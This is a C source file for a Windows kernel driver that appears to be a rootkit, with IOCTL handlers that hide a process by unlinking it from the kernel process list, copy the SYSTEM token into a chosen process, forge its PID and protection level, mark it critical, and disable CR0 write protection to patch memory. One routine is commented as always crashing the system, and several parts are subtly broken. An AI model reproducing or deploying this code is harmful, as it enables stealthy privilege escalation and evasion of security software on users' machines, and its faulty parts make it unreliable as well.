#include "Driver.h"

#define DEVICE_NAME         L"\\Device\PsProtectEx"
#define SYMBOLIC_LINK_NAME  L"\\DosDevices\\PsProtectEx"

#define IOCTL_OFFSET_Protection            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_UniqueProcessId       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ApcQueueable          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ActiveProcessLinks    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_Hide_Process                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_PID4                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Set_PPL                      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Token_Up                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Set_Critical                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ApcQueueable                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_RET_PROCESS                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT g_DeviceObject = NULL;

NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject);
NTSTATUS DeleteDevice();
NTSTATUS HideProcess(ULONG TargetProcID);
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);
NTSTATUS DispatchDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);

EXTERN_C
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;

    DriverObject->DriverUnload = DriverUnload;

    status = CreateDevice(DriverObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

    return STATUS_SUCCESS;
}

NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    UNICODE_STRING deviceName, symbolicLinkName;
    PDEVICE_OBJECT deviceObject = NULL;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);

    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    g_DeviceObject = deviceObject;

    return STATUS_SUCCESS;
}

NTSTATUS DeleteDevice()
{
    UNICODE_STRING symbolicLinkName;

    if (g_DeviceObject != NULL) {
        RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);
        IoDeleteSymbolicLink(&symbolicLinkName);
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }

    return STATUS_SUCCESS;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    DeleteDevice();
}

NTSTATUS DispatchCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

NTSTATUS HideProcess(ULONG TargetProcID)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)TargetProcID, &process);

    if (NT_SUCCESS(status))
    {
                LIST_ENTRY* blink = (LIST_ENTRY*)((char*)process + ActiveProcessLinksOffset);

                blink->Flink->Blink = blink->Blink;
                blink->Blink->Flink = blink->Flink;

                ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}

NTSTATUS SetPid4(ULONG TargetProcID)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)TargetProcID, &process);

    if (NT_SUCCESS(status))
    {
        *(int*)((ULONG64)process + UniqueProcessIdOffset) = 4;
        ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}

NTSTATUS SetPPL(ULONG pid)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);
    if (NT_SUCCESS(status))
    {
        *(int*)((ULONG64)process + ProtectionOffset) = PPL_Antimalware;
        ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}

NTSTATUS TokenLevelUp(ULONG pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG SYSTEM_PROCESS_PID = 4;

    status = PsLookupProcessByProcessId((HANDLE)pid, &targetProcess);
    ULONG64 tokenOffset = GetTokenOffset();

    if (!NT_SUCCESS(status) || tokenOffset == STATUS_UNSUCCESSFUL)
        return status;

    status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

    if (!NT_SUCCESS(status))
    {
        ObDereferenceObject(targetProcess);
        return status;
    }

    *(UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

    ObDereferenceObject(privilegedProcess);
    ObDereferenceObject(targetProcess);
    return status;
}

NTSTATUS SetCriticalProcess(ULONG Pid) {
    NTSTATUS status = STATUS_SUCCESS;

    CLIENT_ID clientId;
    HANDLE handle, hToken;

    TOKEN_PRIVILEGES tkp = { 0 };
    OBJECT_ATTRIBUTES objAttr;
    ULONG BreakOnTermination = 1;

    clientId.UniqueThread = NULL;
    clientId.UniqueProcess = ULongToHandle(Pid);
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (NT_SUCCESS(status))
    {

        status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
        if (!NT_SUCCESS(status))
        {
            ZwClose(hToken);
        }

        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
        tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);
        status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
        if (!NT_SUCCESS(status))
        {
            ZwClose(hToken);
        }

        status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
        if (!NT_SUCCESS(status))
        {
            ZwClose(hToken);
        }

        tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
        status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
        if (!NT_SUCCESS(status))
        {
            ZwClose(hToken);
        }
        PRIVILEGE_MAPPING
            ZwClose(hToken);
    }
    return STATUS_SUCCESS;
}

PETHREAD LookupThread(HANDLE Tid)
{
    PETHREAD ethread;
    if (NT_SUCCESS(PsLookupThreadByThreadId(Tid, &ethread)))
        return ethread;
    else
        return NULL;
}

VOID InjectApc(PEPROCESS Process)
{
    ULONG i = 0, c = 0;
    PETHREAD ethrd = NULL;
    PEPROCESS eproc = NULL;


    for (i = 4; i < 232000; i = i + 4)
    {
        ethrd = LookupThread((HANDLE)i);
        if (ethrd != NULL)
        {
            eproc = IoThreadToProcess(ethrd);
            if (eproc == Process)
            {

                ULONG64 value = *(PULONG64)((ULONG64)ethrd + ApcQueueableOffset) & 0xFFFFFFFFFBFFF;
                *(PULONG64)((ULONG64)ethrd + ApcQueueableOffset) = value;

            }
            ObDereferenceObject(ethrd);
        }
    }
}

NTSTATUS ApcQueueable(ULONG pid)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);

    if (NT_SUCCESS(status))
    {
        InjectApc(process);
        ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}

KIRQL  DisabledMemProt()
{
    KIRQL  irql = KeRaiseIrqlToDpcLevel();
    UINT64  cr0 = __readcr0();
    cr0 &= 0xfffffffffffeffff;
    _disable();
    __writecr0(cr0);
    return  irql;
}

void  EnabledMemProt(KIRQL  irql)
{
    UINT64  cr0 = __readcr0();
    cr0 |= 0x10000;
    _enable();
    __writecr0(cr0);
    KeLowerIrql(irql);
}

BOOLEAN RetProcess(HANDLE Pid)   //破坏进程特征用的，但是100%蓝屏,当时不知道为啥把这玩意写进去了,别用就对了
{
    UCHAR ret[] = "\xB8\x22\x00\x00\xC0\xC3";
    KIRQL kirql;
    if (Pid == NULL) return FALSE;
    kirql = DisabledMemProt();
    memcpy(Pid, ret, sizeof(ret) / sizeof(ret[0]));
    EnabledMemProt(kirql);
    return TRUE;
}

NTSTATUS DispatchDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;

    switch (code) {
    case IOCTL_OFFSET_Protection:
    {
        ULONG offset = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        ProtectionOffset = offset;
        break;
    }
    case IOCTL_OFFSET_UniqueProcessId:
    {
        ULONG offset = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        UniqueProcessIdOffset = offset;
        break;
    }
    case IOCTL_OFFSET_ApcQueueable:
    {
        ULONG offset = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        ApcQueueableOffset = offset;
        break;
    }
    case IOCTL_OFFSET_ActiveProcessLinks:
    {
        ULONG offset = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        ActiveProcessLinksOffset = offset;
        break;
    }
    case IOCTL_Hide_Process:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = HideProcess(pid);
        break;
    }
    case IOCTL_SET_PID4:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = SetPid4(pid);
        break;
    }
    case IOCTL_Set_PPL:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = SetPPL(pid);
        break;
    }
    case IOCTL_Token_Up:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = TokenLevelUp(pid);
        break;
    }
    case IOCTL_Set_Critical:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = SetCriticalProcess(pid);
        break;
    }
    case IOCTL_ApcQueueable:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = ApcQueueable(pid);
        break;
    }
    case IOCTL_RET_PROCESS:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        RetProcess((HANDLE)pid);
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}
